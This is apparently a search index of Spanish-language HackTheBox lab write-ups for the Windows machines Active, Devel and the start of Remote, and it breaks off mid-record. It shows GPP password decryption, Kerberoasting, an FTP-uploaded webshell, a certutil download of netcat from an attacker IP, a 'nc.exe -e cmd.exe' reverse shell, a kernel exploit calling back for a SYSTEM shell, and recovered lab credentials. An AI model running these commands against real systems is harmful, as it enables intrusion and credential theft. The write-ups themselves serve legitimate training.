https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 70.52 seconds\n</code></pre>","tags":["SMB Enumeration","Abusing GPP Passwords","Decrypting GPP Passwords - gpp-decrypt","Kerberoasting Attack (GetUserSPNs.py) [Privilege Escalation]"]},{"location":"HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Active/#enumeracion","title":"Enumeraci\u00f3n","text":"","tags":["SMB Enumeration","Abusing GPP Passwords","Decrypting GPP Passwords - gpp-decrypt","Kerberoasting Attack (GetUserSPNs.py) [Privilege Escalation]"]},{"location":"HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Active/#servicios","title":"Servicios","text":"","tags":["SMB Enumeration","Abusing GPP Passwords","Decrypting GPP Passwords - gpp-decrypt","Kerberoasting Attack (GetUserSPNs.py) [Privilege Escalation]"]},{"location":"HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Active/#smb-445","title":"smb - 445","text":"","tags":["SMB Enumeration","Abusing GPP Passwords","Decrypting GPP Passwords - gpp-decrypt","Kerberoasting Attack (GetUserSPNs.py) [Privilege Escalation]"]},{"location":"HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Active/#manual","title":"Manual","text":"<p>Se identificaron folders compartidos haciendo uso de <code>smbclient</code> de los cuales se permitia el acceso an\u00f3nimo al share de <code>Replication</code>.</p> <p></p> <p>Al conectarse al directorio compartido de <code>Replication</code> se usaron los comandos:</p> <ol> <li><code>prompt off</code> - Para deshabilitar la confirmaci\u00f3n al descargar cualquier archivo.</li> <li><code>recurse on</code> - Para habilitar la recursividad si se llega a encontrar un directorio.</li> <li><code>mget *</code> - Para descargar todos los archivos y directorios disponibles.</li> </ol> <p>Se identific\u00f3 un archivo el cual expone un usuario y un hash disponible para crackear.</p> <p></p> <p>Contenido de <code>Groups.xml</code>:</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;Groups clsid=\"{3125E937-EB16-4b4c-9934-544FC6D24D26}\"&gt;&lt;User clsid=\"{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}\" name=\"active.htb\\SVC_TGS\" image=\"2\" changed=\"2018-07-18 20:46:06\" uid=\"{EF57DA28-5F69-4530-A59E-AAB58578219D}\"&gt;&lt;Properties action=\"U\" newName=\"\" fullName=\"\" description=\"\" cpassword=\"edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\" changeLogon=\"0\" noChange=\"1\" neverExpires=\"1\" acctDisabled=\"0\" userName=\"active.htb\\SVC_TGS\"/&gt;&lt;/User&gt;\n&lt;/Groups&gt;\n</code></pre>","tags":["SMB Enumeration","Abusing GPP Passwords","Decrypting GPP Passwords - gpp-decrypt","Kerberoasting Attack (GetUserSPNs.py) [Privilege Escalation]"]},{"location":"HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Active/#explotacion","title":"Explotaci\u00f3n","text":"","tags":["SMB Enumeration","Abusing GPP Passwords","Decrypting GPP Passwords - gpp-decrypt","Kerberoasting Attack (GetUserSPNs.py) [Privilege Escalation]"]},{"location":"HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Active/#descrifrado-de-gpp","title":"Descrifrado de GPP","text":"","tags":["SMB Enumeration","Abusing GPP Passwords","Decrypting GPP Passwords - gpp-decrypt","Kerberoasting Attack (GetUserSPNs.py) [Privilege Escalation]"]},{"location":"HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Active/#ejecucion","title":"Ejecuci\u00f3n","text":"<p>Al identificar qu\u00e9 tipo de credencial es la que se encuentra en <code>Groups.xml</code> se identific\u00f3 una vulnerabilidad relacionada con las Group Policy Preferences, dado el leak de la llave y suponiendo que la m\u00e1quina no se encuentra parchada se puede descifrar la contrase\u00f1a haciendo uso de <code>gpp-decrypt</code>.</p> <p></p>","tags":["SMB Enumeration","Abusing GPP Passwords","Decrypting GPP Passwords - gpp-decrypt","Kerberoasting Attack (GetUserSPNs.py) [Privilege Escalation]"]},{"location":"HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Active/#kerberoasting","title":"Kerberoasting","text":"","tags":["SMB Enumeration","Abusing GPP Passwords","Decrypting GPP Passwords - gpp-decrypt","Kerberoasting Attack (GetUserSPNs.py) [Privilege Escalation]"]},{"location":"HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Active/#ejecucion_1","title":"Ejecuci\u00f3n","text":"<p>Dados los puertos abiertos que tiene la m\u00e1quina se puede intuir que la m\u00e1quina objetivo es un Domain Controller, contemplado esto y que se cuenta con credenciales se puede hacer uso de <code>impacket-GetUserSPNs</code> para buscar conseguir un hash de alguna otra cuenta que permita el acceso a la m\u00e1quina. Utilizando:</p> <pre><code>impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request\n</code></pre> <p></p> <p>Al identificar el error de sesi\u00f3n se\u00f1alado debido a que la hora de la m\u00e1quina no corresponde con la que se utiliza, se ocupa <code>ntpdate</code> para sincronizar la hora local con la de la m\u00e1quina objetivo, se\u00f1alando que el \u00fanico comportamiento funcional encontrado fue utilizando el hostname de la m\u00e1quina por lo que se modific\u00f3 <code>/etc/hosts</code> para a\u00f1adir la entrada del hostname con la IP, configurando as\u00ed la hora local.</p> <p>Posteriormente se ejecut\u00f3 de nuevo la herramienta de impacket para obtener el hash.</p> <p></p> <p>Hash obtenido:</p> <pre><code>$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$b9225835ed0789a77d29228e13c82766$9bf95664d6316261f490688514dadd5470eb70fed87666be26d2e2fbe30691d7ce3377cf176e3bb2e0d459a6a7d25153e89ef9a44d13e16012e3ba81bc3b19a84653d112df3c4e21329bed80b91938da785d8aed471821a4c990559930aee3312e70cccdbbeb52c3c454c4d4b712c9ebf66602062bfc993d7de4c4250f8706a98b75109467a74522538816a92d462c8e7279556c4f3e4f9fe8447d326876fa169608c143847436fb761b2f0aa5122b90f5af045b73a1d2fa2a7e9f432fab538302dc6575d1d5095e89e7d66febce084b6fad6deb79cbd1db17f7cbd49907b0bed27958ade09ef2ed7baaf1e18d5d368c5c29aa614e8584669dd8d6a4d52bdebabfdaa48b68b4db41411aef874ea76c301b9fff65f81c48822e263530b788cc75231fdd78c3879ad254e92edbe4b7efb8909d37ec1699f58b75a32b73da4fca77ae566d5b3c1b1ae67a74cae08988429d54694bc1f3030cbc5aa59113b35129a98f2c32d6faa69816facb1153327d242019a5a2aad1ba5420449421a39b6a250e424ed9d8863edb0429ff54d33df78d3bed41ac41ca509250750cfc4db6dc91ced953db230554b681fd5569407664542f2fac85f3d385ca42038c9d8e7eaacfe07dd480efeeb6843127d084b0a08be254bfe9166e810108590e7e064bbe36e3d3a6faf5d05fab1015536cc34b8cdc27d80450a0b139bcd8ece127c6600218c3d1a75558aac8bf3094a5ca6d98bfc309b89d7e7fb1a03df601d98be07e26fa746629a5fa7492e489154348dcfd29800ab9fc49bb793a430510564a8525da693112b9243a4840b59360e7ca1d449f5faf35a15aa4902d94c1ed0dca1b3d8c0ea083f4c823f17c730c9bfbdb9c93abc9250cdface8a4da66da5c6868c4de96f344c4102ab56be8385237a0755ac26a8f7119fc55e698748c14ae37ec11c8a4e534e2ebf99c12877b64bf9ef636d487afee40de5115a5aff0f8ca7a2f059b4e56db5dea6069fc56ece3bd63d47b13889cad441635f6ac03d5688ea7041811ff55a462e0292bfe1f234b8a5994dd8efe0b4fde336d4815026e80ae3f96a9d025db0d9ba55183ed2a53e8b3f002e3aa5d3f744f8b46322dba0918130fc0b7f4a85342cae3a14fc9a555983668dd5c7ad63934a407e7a055c610b371bf3772c8e85b173ab9bdb22f76e9fbef451678abfb3db0a300d0c18db7ba907536d1dc3008b4488fee3d4bde9e8d719001bb7ebdf66df8f18132eb9d2d867d207bcb\n</code></pre> <p>Lo que resultar\u00eda en buscar el crackeo del hash obtenido (ejecut\u00e1ndolo en esta ocasi\u00f3n usando <code>john</code>) para poder obtener acceso a la m\u00e1quina, haciendo uso de <code>impacket-psexec</code> proporcionando las credenciales obtenidas.</p> <p></p> <p></p>","tags":["SMB Enumeration","Abusing GPP Passwords","Decrypting GPP Passwords - gpp-decrypt","Kerberoasting Attack (GetUserSPNs.py) [Privilege Escalation]"]},{"location":"HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Active/#credenciales-obtenidas","title":"Credenciales obtenidas","text":"Alcance Usuario Contrase\u00f1a (hash \u2192 pass) Fuente SO SVC_TGS <code>edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ</code> \u2192 GPPstillStandingStrong2k18 smb (<code>Groups.xml</code>) + <code>gpp-decrypt</code> SO Administrator <code>$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$b92258...</code> \u2192 Ticketmaster1968 <code>impacket-GetUserSPNs</code> + cracking","tags":["SMB Enumeration","Abusing GPP Passwords","Decrypting GPP Passwords - gpp-decrypt","Kerberoasting Attack (GetUserSPNs.py) [Privilege Escalation]"]},{"location":"HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Devel/","title":"Devel","text":"<p>Write-up de la m\u00e1quina Devel de HackTheBox.</p> <p></p>","tags":["Abusing FTP + IIS Services","Microsoft Windows (x86) \u2013 \u2018afd.sys\u2019 (MS11-046) [Privilege Escalation]"]},{"location":"HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Devel/#indice","title":"\u00cdndice","text":"<ul> <li>Introducci\u00f3n</li> <li>Estad\u00edsticas</li> <li>Reconocimiento</li> <li>Escaneo de host<ul> <li>Escaneo completo de puertos</li> <li>Escaneo espec\u00edfico</li> </ul> </li> <li>Enumeraci\u00f3n</li> <li>Servicios<ul> <li>ftp - 21</li> </ul> </li> <li>Explotaci\u00f3n</li> <li>RCE</li> <li>Post Explotaci\u00f3n</li> <li>Enumeraci\u00f3n</li> <li>Escalaci\u00f3n de privilegios<ul> <li>nt apppool\\web \u2192 nt authority\\system</li> </ul> </li> <li>Referencias</li> </ul>","tags":["Abusing FTP + IIS Services","Microsoft Windows (x86) \u2013 \u2018afd.sys\u2019 (MS11-046) [Privilege Escalation]"]},{"location":"HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Devel/#introduccion","title":"Introducci\u00f3n","text":"","tags":["Abusing FTP + IIS Services","Microsoft Windows (x86) \u2013 \u2018afd.sys\u2019 (MS11-046) [Privilege Escalation]"]},{"location":"HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Devel/#estadisticas","title":"Estad\u00edsticas","text":"Caracter\u00edstica Descripci\u00f3n Nombre Devel OS Windows Dificultad oficial Easy Dificultad de comunidad Puntos 20 Creadores ch4p","tags":["Abusing FTP + IIS Services","Microsoft Windows (x86) \u2013 \u2018afd.sys\u2019 (MS11-046) [Privilege Escalation]"]},{"location":"HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Devel/#reconocimiento","title":"Reconocimiento","text":"","tags":["Abusing FTP + IIS Services","Microsoft Windows (x86) \u2013 \u2018afd.sys\u2019 (MS11-046) [Privilege Escalation]"]},{"location":"HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Devel/#escaneo-de-host","title":"Escaneo de host","text":"","tags":["Abusing FTP + IIS Services","Microsoft Windows (x86) \u2013 \u2018afd.sys\u2019 (MS11-046) [Privilege Escalation]"]},{"location":"HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Devel/#escaneo-completo-de-puertos","title":"Escaneo completo de puertos","text":"<pre><code>\u2514\u2500$ nmap -T5 -vvv -open -p- -n -Pn -oG nmap/all_ports $TARGET\nHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-06-16 10:23 EDT\nInitiating Connect Scan at 10:23\nScanning 10.10.10.5 [65535 ports]\nDiscovered open port 21/tcp on 10.10.10.5\nDiscovered open port 80/tcp on 10.10.10.5\nConnect Scan Timing: About 26.80% done; ETC: 10:25 (0:01:25 remaining)\nCompleted Connect Scan at 10:25, 112.65s elapsed (65535 total ports)\nNmap scan report for 10.10.10.5\nHost is up, received user-set (0.064s latency).\nScanned at 2022-06-16 10:23:39 EDT for 113s\nNot shown: 65533 filtered tcp ports (no-response)\nSome closed ports may be reported as filtered due to --defeat-rst-ratelimit\nPORT   STATE SERVICE REASON\n21/tcp open  ftp     syn-ack\n80/tcp open  http    syn-ack\n\nRead data files from: /usr/bin/../share/nmap\nNmap done: 1 IP address (1 host up) scanned in 112.68 seconds\n</code></pre>","tags":["Abusing FTP + IIS Services","Microsoft Windows (x86) \u2013 \u2018afd.sys\u2019 (MS11-046) [Privilege Escalation]"]},{"location":"HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Devel/#escaneo-especifico","title":"Escaneo espec\u00edfico","text":"<pre><code>\u2514\u2500$ nmap -sCV -p 80,21 -n -Pn -oN nmap/targeted $TARGET\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-06-16 10:29 EDT\nNmap scan report for 10.10.10.5\nHost is up (0.064s latency).\n\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     Microsoft ftpd\n| ftp-syst:\n|_  SYST: Windows_NT\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n| 03-18-17  02:06AM       &lt;DIR&gt;          aspnet_client\n| 03-17-17  05:37PM                  689 iisstart.htm\n|_03-17-17  05:37PM               184946 welcome.png\n80/tcp open  http    Microsoft IIS httpd 7.5\n|_http-title: IIS7\n| http-methods:\n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/7.5\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 10.36 seconds\n</code></pre>","tags":["Abusing FTP + IIS Services","Microsoft Windows (x86) \u2013 \u2018afd.sys\u2019 (MS11-046) [Privilege Escalation]"]},{"location":"HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Devel/#enumeracion","title":"Enumeraci\u00f3n","text":"","tags":["Abusing FTP + IIS Services","Microsoft Windows (x86) \u2013 \u2018afd.sys\u2019 (MS11-046) [Privilege Escalation]"]},{"location":"HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Devel/#servicios","title":"Servicios","text":"","tags":["Abusing FTP + IIS Services","Microsoft Windows (x86) \u2013 \u2018afd.sys\u2019 (MS11-046) [Privilege Escalation]"]},{"location":"HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Devel/#ftp-21","title":"ftp - 21","text":"<p>Si bien se busc\u00f3 analizar el servicio http, no se encontr\u00f3 nada relevante que pudiera sobresalir para la fase de explotaci\u00f3n, salvo la recopilaci\u00f3n de informaci\u00f3n ya presente en el escaneo de nmap el cu\u00e1l presenta la versi\u00f3n del servidor IIS presente.</p> <p>Al identificar mediante el escaneo espec\u00edfico de nmap el logueo por medio de la cuenta an\u00f3nima que ofrecen los servidores ftp, se busc\u00f3 ingresar para visualizar qu\u00e9 archivos se encontraban presentes y si adem\u00e1s de permitir el listado de estos, se permit\u00eda la escritura en el directorio.</p> <p>Al visualizar los archivos disponibles se identific\u00f3 que correspond\u00edan con los archivos relacionados al servidor web en cuesti\u00f3n, por lo que al cargar un archivo de prueba se busc\u00f3 visualizarlo mediante el navegador, corroborando as\u00ed un camino de explotaci\u00f3n mediante la ejecuci\u00f3n de c\u00f3digo.</p> <p></p> <p>Visualizaci\u00f3n en navegador</p> <p></p>","tags":["Abusing FTP + IIS Services","Microsoft Windows (x86) \u2013 \u2018afd.sys\u2019 (MS11-046) [Privilege Escalation]"]},{"location":"HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Devel/#explotacion","title":"Explotaci\u00f3n","text":"","tags":["Abusing FTP + IIS Services","Microsoft Windows (x86) \u2013 \u2018afd.sys\u2019 (MS11-046) [Privilege Escalation]"]},{"location":"HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Devel/#rce","title":"RCE","text":"<p>De acuerdo a la tecnolog\u00eda empleada se busc\u00f3 cargar una webshell de <code>asp</code> para ejecutar comandos en la m\u00e1quina, la cual se puede ubicar en <code>/usr/share/webshells/asp</code>.</p> <p></p> <p>Por lo que despu\u00e9s de la carga del binario de netcat mediante:</p> <pre><code>certutil.exe -f -urlcache http://10.10.14.16/nc.exe c:\\windows\\temp\\nc.exe\n</code></pre> <p>Se obtuvo una reverse shell como <code>iis apppool\\web</code> entablandola con:</p> <pre><code>c:\\windows\\temp\\nc.exe -e cmd.exe 10.10.14.16 1234\n</code></pre> <p></p> <p>Reverse shell entablada:</p> <p></p>","tags":["Abusing FTP + IIS Services","Microsoft Windows (x86) \u2013 \u2018afd.sys\u2019 (MS11-046) [Privilege Escalation]"]},{"location":"HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Devel/#post-explotacion","title":"Post Explotaci\u00f3n","text":"","tags":["Abusing FTP + IIS Services","Microsoft Windows (x86) \u2013 \u2018afd.sys\u2019 (MS11-046) [Privilege Escalation]"]},{"location":"HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Devel/#enumeracion_1","title":"Enumeraci\u00f3n","text":"<p>Al identificar mediante <code>systeminfo</code> que se trataba de una versi\u00f3n vieja de Windows 7, sumando que en la misma informaci\u00f3n mostrada por el comando no se visualizaba ning\u00fan parche instalado, se asumi\u00f3 que la ruta de escalaci\u00f3n iba intencionada a realizarse por medio de explotaci\u00f3n de kernel.</p> <p></p>","tags":["Abusing FTP + IIS Services","Microsoft Windows (x86) \u2013 \u2018afd.sys\u2019 (MS11-046) [Privilege Escalation]"]},{"location":"HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Devel/#escalacion-de-privilegios","title":"Escalaci\u00f3n de privilegios","text":"","tags":["Abusing FTP + IIS Services","Microsoft Windows (x86) \u2013 \u2018afd.sys\u2019 (MS11-046) [Privilege Escalation]"]},{"location":"HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Devel/#nt-apppoolweb-nt-authoritysystem","title":"nt apppool\\web \u2192 nt authority\\system","text":"<p>Despu\u00e9s de ocupar el repositorio de exploits de kernel de windows para buscar alguno que fuera a la par de la fecha y acorde a la versi\u00f3n del sistema operativo, se encontr\u00f3 que el exploit relacionado a <code>MS10-59</code> era operativo pero debido a que el presente en el repositorio es presentado mediante una prueba de concepto la cual retorna una shell lanzando otro proceso/ventana y no en la presente a donde se ejecuta.</p> <p>Se opt\u00f3 por buscar alguna otra prueba de concepto que permitiera otro enfoque, encontrando as\u00ed otro repositorio del mismo exploit el cu\u00e1l mediante la especificaci\u00f3n de la IP de escucha y puerto permite entablar una reverse shell como <code>nt authority\\system</code>, obteniendola mediante:</p> <pre><code>.\\churri.exe 10.10.14.16 4321\n</code></pre> <p></p>","tags":["Abusing FTP + IIS Services","Microsoft Windows (x86) \u2013 \u2018afd.sys\u2019 (MS11-046) [Privilege Escalation]"]},{"location":"HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Devel/#referencias","title":"Referencias","text":"<ul> <li>Windows Kernel Exploits.</li> <li>egre55 - MS10-059.</li> </ul>","tags":["Abusing FTP + IIS Services","Microsoft Windows (x86) \u2013 \u2018afd.sys\u2019 (MS11-046) [Privilege Escalation]"]},{"location":"HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Remote/","title":"Remote","text":"<p>Write-up de la m\u00e1quina Remote de HackTheBox.</p> <p></p>","tags":["Web Enumeration","NFS Enumeration - Showmount","Information Leakage","Abusing Umbraco Admin Panel","Umbraco CMS - Remote Code Execution by authenticated administrators","Obtaining the TeamViewer password from the system registers (AES128 - CBC) [Privilege Escalation]"]},{"location":"HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Remote/#indice","title":"\u00cdndice","text":"<ul> <li>Introducci\u00f3n</li> <li>Estad\u00edsticas</li> <li>Reconocimiento</li> <li>Escaneo de host<ul> <li>Escaneo completo de puertos</li> <li>Escaneo espec\u00edfico</li> </ul> </li> <li>Enumeraci\u00f3n</li> <li>Servicios<ul> <li>http - 80</li> <li>ffuf</li> <li>Manual</li> <li>mountd - 2049</li> </ul> </li> <li>Explotaci\u00f3n</li> <li>Cracking de hash obtenido</li> <li>RCE</li> <li>Post Explotaci\u00f3n</li> <li>Enumeraci\u00f3n</li> <li>Escalaci\u00f3n de privilegios<ul> <li>iis apppool \u2192 nt authority system</li> <li>TeamViewer</li> <li>Modificaci\u00f3n de servicios</li> <li>JuicyPotato</li> </ul> </li> <li>Referencias</li> </ul>","tags":["Web Enumeration","NFS Enumeration - Showmount","Information Leakage","Abusing Umbraco Admin Panel","Umbraco CMS - Remote Code Execution by authenticated administrators","Obtaining the TeamViewer password from the system registers (AES128 - CBC) [Privilege Escalation]"]},{"location":"HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Remote/#introduccion","title":"Introducci\u00f3n","text":"","tags":["Web Enumeration","NFS Enumeration - Showmount","Information Leakage","Abusing Umbraco Admin Panel","Umbraco CMS - Remote Code Execution by authenticated administrators","Obtaining the TeamViewer password from the system registers (AES128 - CBC) [Privilege Escalation]"]},{"location":"HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Remote/#estadisticas","title":"Estad\u00edsticas","text":"Caracter\u00edstica Descripci\u00f3n Nombre Remote OS Windows Dificultad oficial Easy Dificultad de comunidad Puntos 20 Creadores mrb3n","tags":["Web Enumeration","NFS Enumeration - Showmount","Information Leakage","Abusing Umbraco Admin Panel","Umbraco CMS - Remote Code Execution by authenticated administrators","Obtaining the TeamViewer password from the system registers (AES128 - CBC) [Privilege Escalation]"]},{"location":"HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Remote/#reconocimiento","title":"Reconocimiento","text":"","tags":["Web Enumeration","NFS Enumeration - Showmount","Information Leakage","Abusing Umbraco Admin Panel","Umbraco CMS - Remote Code Execution by authenticated administrators","Obtaining the TeamViewer password from the system registers (AES128 - CBC) [Privilege Escalation]"]},{"location":"HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Remote/#escaneo-de-host","title":"Escaneo de host","text":"","tags":["Web Enumeration","NFS Enumeration - Showmount","Information Leakage","Abusing Umbraco Admin Panel","Umbraco CMS - Remote Code Execution by authenticated administrators","Obtaining the TeamViewer password from the system registers (AES128 - CBC) [Privilege Escalation]"]},{"location":"HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Remote/#escaneo-completo-de-puertos","title":"Escaneo completo de puertos","text":"<pre><code>\u2514\u2500$ sudo nmap -sS --min-rate 5000 -vvv -open -p- -n -Pn -oG nmap/all_ports_ss $TARGET\nHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-06-02 09:05 EDT\nInitiating SYN Stealth Scan at 09:05\nScanning 10.10.10.180 [65535 ports]\nDiscovered open port 80/tcp on 10.10.10.180\nDiscovered open port 111/tcp on 10.10.10.180\nDiscovered open port 445/tcp on 10.10.10.180\nDiscovered open port 135/tcp on 10.10.10.180\nDiscovered open port 139/tcp on 10.10.10.180\nDiscovered open port 21/tcp on 10.10.10.180\nDiscovered open port 49664/tcp on 10.10.10.180\nDiscovered open port 49665/tcp on 10.10.10.180\nDiscovered open port 5985/tcp on 10.10.10.180\nDiscovered open port 49667/tcp on 10.10.10.180\nDiscovered open port 49678/tcp on 10.10.10.180\nDiscovered open port 47001/tcp on 10.10.10.180\nDiscovered open port 49680/tcp on 10.10.10.180\nDiscovered open port 49666/tcp on 10.10.10.180\nDiscovered open port 49679/tcp on 10.10.10.180\nDiscovered open port 2049/tcp on 10.10.10.180\nCompleted SYN Stealth Scan at 09:05, 13.25s elapsed (65535 total ports)\nNmap scan report for 10.10.10.180\nHost is up, received user-set (0.068s latency).\nScanned at 2022-06-02 09:05:13 EDT for 13s\nNot shown: 65519 closed tcp ports (reset)\nPORT      STATE SERVICE      REASON\n21/tcp    open  ftp          syn-ack ttl 127\n80/tcp    open  http         syn-ack ttl 127\n111/tcp   open  rpcbind      syn-ack ttl 127\n135/tcp   open  msrpc        syn-ack ttl 127\n139/tcp   open  netbios-ssn  syn-ack ttl 127\n445/tcp   open  microsoft-ds syn-ack ttl 127\n2049/tcp  open  nfs          syn-ack ttl 127\n5985/tcp  open  wsman        syn-ack ttl 127\n47001/tcp open  winrm        syn-ack ttl 127\n49664/tcp open  unknown      syn-ack ttl 127\n49665/tcp open  unknown      syn-ack ttl 127\n49666/tcp open  unknown      syn-ack ttl 127\n49667/tcp open  unknown      syn-ack ttl 127\n49678/tcp open  unknown      syn-ack ttl 127\n49679/tcp open  unknown      syn-ack ttl 127\n49680/tcp open  unknown      syn-ack ttl 127\n\nRead data files from: /usr/bin/../share/nmap\nNmap done: 1 IP address (1 host up) scanned in 13.33 seconds\n           Raw packets sent: 65924 (2.901MB) | Rcvd: 65535 (2.621MB)\n</code></pre>","tags":["Web Enumeration","NFS Enumeration - Showmount","Information Leakage","Abusing Umbraco Admin Panel","Umbraco CMS - Remote Code Execution by authenticated administrators","Obtaining the TeamViewer password from the system registers (AES128 - CBC) [Privilege Escalation]"]},{"location":"HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Remote/#escaneo-especifico","title":"Escaneo espec\u00edfico","text":"<pre><code>\u2514\u2500$ nmap -sCV -p 21,80,111,135,139,445,2049,5985,47001,49664,49665,49666,49667,49678,49679,49680 -n -Pn -oN nmap/targeted $TARGET\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-06-02 09:08 EDT\nNmap scan report for 10.10.10.180\nHost is up (0.064s latency).\n\nPORT      STATE SERVICE       VERSION\n21/tcp    open  ftp           Microsoft ftpd\n| ftp-syst:\n|_  SYST: Windows_NT\n|_ftp-anon: Anonymous FTP login allowed (FTP code 230)\n80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Home - Acme Widgets\n111/tcp   open  rpcbind       2-4 (RPC #100000)\n| rpcinfo:\n|   program version    port/proto  service\n|   100000  2,3,4        111/tcp   rpcbind\n|   100000  2,3,4        111/tcp6  rpcbind\n|   100000  2,3,4        111/udp   rpcbind\n|   100000  2,3,4        111/udp6  rpcbind\n|   100003  2,3         2049/udp   nfs\n|   100003  2,3         2049/udp6  nfs\n|   100003  2,3,4       2049/tcp   nfs\n|   100003  2,3,4       2049/tcp6  nfs\n|   100005  1,2,3       2049/tcp   mountd\n|   100005  1,2,3       2049/tcp6  mountd\n|   100005  1,2,3       2049/udp   mountd\n|   100005  1,2,3       2049/udp6  mountd\n|   100021  1,2,3,4     2049/tcp   nlockmgr\n|   100021  1,2,3,4     2049/tcp6  nlockmgr\n|   100021  1,2,3,4     2049/udp   nlockmgr\n|   100021  1,2,3,4     2049/udp6  nlockmgr\n|   100024  1           2049/tcp   status\n|   100024  1           2049/tcp6  status\n|   100024  1           2049/udp   status\n|_  100024  1           2049/udp6  status\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds?\n2049/tcp  open  mountd        1-3 (RPC #100005)\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n49664/tcp open  msrpc         Microsoft Windows RPC\n49665/tcp open  msrpc         Microsoft Windows RPC\n49666/tcp open  msrpc         Microsoft Windows RPC\n49667/tcp open  msrpc         Microsoft Windows RPC\n49678/tcp open  msrpc         Microsoft Windows RPC\n49679/tcp open  msrpc         Microsoft Windows RPC\n49680/tcp open  msrpc         Microsoft Windows RPC\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode:\n|   3.1.1:\n|_    Message signing enabled but not required\n| smb2-time:\n|   date: 2022-06-02T13:09:19\n|_  start_date: N/A\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 102.15 seconds\n</code></pre>","tags":["Web Enumeration","NFS Enumeration - Showmount","Information Leakage","Abusing Umbraco Admin Panel","Umbraco CMS - Remote Code Execution by authenticated administrators","Obtaining the TeamViewer password from the system registers (AES128 - CBC) [Privilege Escalation]"]},{"location":"HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Remote/#enumeracion","title":"Enumeraci\u00f3n","text":"","tags":["Web Enumeration","NFS Enumeration - Showmount","Information Leakage","Abusing Umbraco Admin Panel","Umbraco CMS - Remote Code Execution by authenticated administrators","Obtaining the TeamViewer password from the system registers (AES128 - CBC) [Privilege Escalation]"]},{"location":"HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Remote/#servicios","title":"Servicios","text":"","tags":["Web Enumeration","NFS Enumeration - Showmount","Information Leakage","Abusing Umbraco Admin Panel","Umbraco CMS - Remote Code Execution by authenticated administrators","Obtaining the TeamViewer password from the system registers (AES128 - CBC) [Privilege Escalation]"]},{"location":"HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Remote/#http-80","title":"http - 80","text":"","tags":["Web Enumeration","NFS Enumeration - Showmount","Information Leakage","Abusing Umbraco Admin Panel","Umbraco CMS - Remote Code Execution by authenticated administrators","Obtaining the TeamViewer password from the system registers (AES128 - CBC) [Privilege Escalation]"]},{"location":"HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Remote/#ffuf","title":"ffuf","text":"<p>Al navegar a trav\u00e9s del sitio disponible y no encontrar informaci\u00f3n relevante en primera instancia, se decidi\u00f3 enumerar directorios de 